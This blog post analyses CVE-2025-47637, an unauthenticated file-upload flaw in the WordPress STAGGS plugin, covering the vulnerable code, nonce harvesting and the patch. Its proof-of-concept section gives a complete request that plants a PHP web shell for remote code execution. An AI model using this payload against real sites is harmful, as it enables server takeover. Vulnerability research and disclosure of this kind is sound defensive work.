---
title: CVE-2025-47637 Analysis & POC
description: Security Vulnerability in WordPress STAGGS Plugin.
date: 2025-11-11 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, arbitrary file upload]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

The **Arbitrary File Upload** vulnerability in the **STAGGS** plugin allows an attacker to upload a **Web Shell** to the web server, affecting **STAGGS versions from n/a to 2.11.0**.

* **CVE ID**: [CVE-2025-47637](https://www.cve.org/CVERecord?id=CVE-2025-47637)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 2.11.0
* **Patched Versions**: 2.12.0
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress STAGGS Plugin 2.11.0 Plugin](https://wordpress.org/plugins/staggs/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **STAGGS Plugin 2.11.0**:

  * `2.11.0` – **vulnerable**
  * `2.12.0` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Cause

The vulnerability occurs in the function `store_final_product_image()` in the file `/wp-content/plugins/staggs/includes/staggs-functions.php` due to not validating the **file type** before upload.

![Validate File Type](diff.png "File type validation")

The patch used a whitelist, accepting only the file types: `png`,`jpg`,`jpeg`,`gif`.

## Code Analysis

The plugin registered an action hook for unauthenticated users (`wp_ajax_nopriv_`):

```php {title="staggs-functions.php" hl_lines=[] data-open=true}
add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' );
```

When accessing the endpoint `/wp-admin/admin-ajax.php` with param `action=staggs_get_configuration_form_urls` the callback `staggs_get_configuration_form_urls_ajax` is called

```php {title="staggs-functions.php" hl_lines=[3,10] data-open=true}
function staggs_get_configuration_form_urls_ajax() {
  $response = array();
  if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) {
    echo json_encode( $response );
    die();
  }
  ...
  if ( isset( $_POST['image_id'] ) ) {
    $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title.
    $image_url  = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true );

    $response['image_url'] = $image_url;
  }
  ...
  echo json_encode( $response );
  die();
}
```

This function checks the `nonce` from the request; if it doesn't exist or is invalid it returns an empty response.

> [!TIP]
> When searching for the keyword `sgg_ajax_nonce`, we see the `nonce` is created with the key `AJAX_NONCE` and has a comment `// image name based on product title.` related to the product. Since this section does not require authentication, it may be a mechanism to serve product display to unauthenticated users, and the `nonce` is inserted directly into the source code.
> When testing the plugin's product creation feature, the system creates a post that unauthenticated users can still access.
> This `nonce` appears in the returned source when accessing the created product.
> ![Nonce Create](nonce_create.png "How the nonce is created")
> ![Create Product](product.png "Create Product using plugin")
> ![Nonce](nonce.png "Nonce taken from response")

If the `nonce` is valid, it proceeds to check whether `$_POST['image_id']` exists; if it does:

* It fetches the `image name`, meaning the **product title** (as described: `// image name based on product title.`)
* Calls `store_final_product_image()` to save the image and obtain the returned URL
* Returns a JSON response containing `image_url`.

```php {title="staggs-functions.php" hl_lines=[2,28,33,35] data-open=true}
function store_final_product_image( $imagename, $data, $options, $main_image = true) {
  if ( preg_match( '/^data:image\/(.*);base64,/', $data, $type ) ) {
    // Valid base64 image.
    $data = substr( $data, strpos($data, ',') + 1 );
    $type = strtolower( $type[1] ); // jpg, png, gif

    $data = str_replace( ' ', '+', $data );
    $data = base64_decode($data);
  
    if ( $data === false ) {
      throw new \Exception('Image decode failed. Try again.');
    }
  } 
  ...
  $upload_dir = wp_get_upload_dir();
  $base_dir   = $upload_dir['basedir'];

  // Allow different location.
  $save_path  = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' );
  if ( ! file_exists( $save_path ) ) {
    mkdir( $save_path, 0777, true );
  }
  if ( $main_image ) {
    // Main product image.
    if ( is_array( $options ) && count( $options ) > 0 ) {
      $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type;
    } else {
      $filename = $imagename . '.' . $type;
    }
  } 
  ...
  // Always override in case something went wrong earlier
  file_put_contents( $save_path . "/{$filename}", $data );
  $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );
  return $image_path_url . "/{$filename}";
}
```

The command:

```php
preg_match('/^data:image\/(.*);base64,/', $data, $type)
```

is used to check whether the variable `$data` is a **Base64 Data URI** image string or not.
Specifically:

* `^data:image\/` → string must start with `data:image/`
* `(.*)` → captures the image format (e.g., `png`, `jpeg`, `gif`, …)
* `;base64,` → followed by the string `;base64,` (indicating the image data is Base64-encoded)
* If it matches, the array `$type` will contain the format info, for example:

  ```php
  $type[1] = 'png';
  ```
* If it doesn't match, i.e., `$data` **is not valid Base64 image data**, the function returns `0`.

Then `$type` is assigned the value of `$type[1]`.

> [!BUG]
> We can pass `$data=data:image/php;base64...` so `$type[1] ='php'`

```php
if ( is_array( $options ) && count( $options ) > 0 ) {
  $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type;
} else {
  $filename = $imagename . '.' . $type;
}
```

If `$options` is not passed then `$filename` will be in the form `product_title.$type`.

Finally, the file is saved using `file_put_contents()` and the URL to it is returned:

```php
file_put_contents( $save_path . "/{$filename}", $data );
$image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path );
return $image_path_url . "/{$filename}";
```

## Flow

{{< mermaid >}}
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
{{< /mermaid >}}

## Proof of Concept (PoC)

1. Obtain the nonce from the returned source
2. Send a POST request

```php
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
...
action=staggs_get_configuration_form_urls&nonce=f281c84283&image_id=1&image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==
```

With `PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==` being the base64 encoding of `<?php system($_REQUEST["cmd"]); ?>`

![Request](request.png "Request with Web Shell payload")

3. Access the returned URL and achieve RCE

![Result](result.png "RCE via file upload")

## Conclusion

The vulnerability allows an **unauthenticated** attacker to upload arbitrary files (e.g., a web shell) via the plugin's AJAX endpoint because the file type is not validated before saving. An attacker can obtain the `nonce` from publicly available source, send a forged `data:` URI (e.g., `data:image/php;base64,...`) and create a PHP file on the server, leading to RCE. The issue was fixed in version **2.12.0** by restricting accepted extensions (png, jpg, jpeg, gif).

## Key Takeaway

* The vulnerability stems from **not properly validating the file type/extension** before saving; client-side/regex checks are insufficient if the extension and actual content are not constrained.
* Do not leave important upload actions exposed as **nopriv (unauthenticated)** endpoints without authentication and strict restrictions.
* `nonce` values embedded in publicly accessible source can be collected and reused — do not rely solely on publicly visible nonces to prevent sensitive actions.
* Validate **MIME type**, **extension**, and (if possible) the actual file content on the server; store uploads in non-executable locations or convert them to non-executable.
* Update the plugin to **>= 2.12.0** immediately; check your site for suspicious files in the `staggs/` upload directory if the site runs an older version.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[WordPress STAGGS Plugin <= 2.11.0 is vulnerable to Arbitrary File Upload](https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability)
